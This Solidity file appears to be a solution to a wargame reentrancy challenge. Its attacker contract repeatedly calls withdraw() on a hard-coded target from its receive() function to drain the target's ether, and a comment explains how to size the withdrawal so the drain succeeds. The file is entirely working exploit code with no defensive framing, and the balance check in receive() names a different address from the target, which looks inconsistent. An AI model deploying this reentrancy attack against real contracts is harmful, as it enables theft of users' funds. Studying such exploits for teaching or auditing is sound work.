// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

/**
 *
 * @notice ReEntrancy achieved through the recieve() function.
 * Fallback function should have worked as well, but the _amount was crucial.
 * Putting a smaller _amount didn't really drain all the funds in a seemingly infinite loop:
 * it's just better to look at the contract balance beforehand and then put in the appropriate withdraw amount in the
 * receive()/fallback() function. Wonder why that is, when you have withdraw() functions with no amount specified being exploited as well
 */

contract Reentrance {
    function withdraw(uint256 _amount) public {}
}

contract Reenter {
    Reentrance reentrance = Reentrance(0x6D69eE7e0F64C06247C436eBCaf2Ca9CFdc2e954);

    function reenterReentrance() public {
        reentrance.withdraw(1000000000000000);
    }

    receive() external payable {
        if (address(0x5F6eC12912A502FcBD3B3152fc6AF068d54B6E43).balance > 0) {
            reentrance.withdraw(1000000000000000);
        }
    }
    // fallback() external payable{
    //     if(address(0x6D69eE7e0F64C06247C436eBCaf2Ca9CFdc2e954).balance > 0){
    //         reentrance.withdraw(1000000000000000);
    //     }
    // }
}
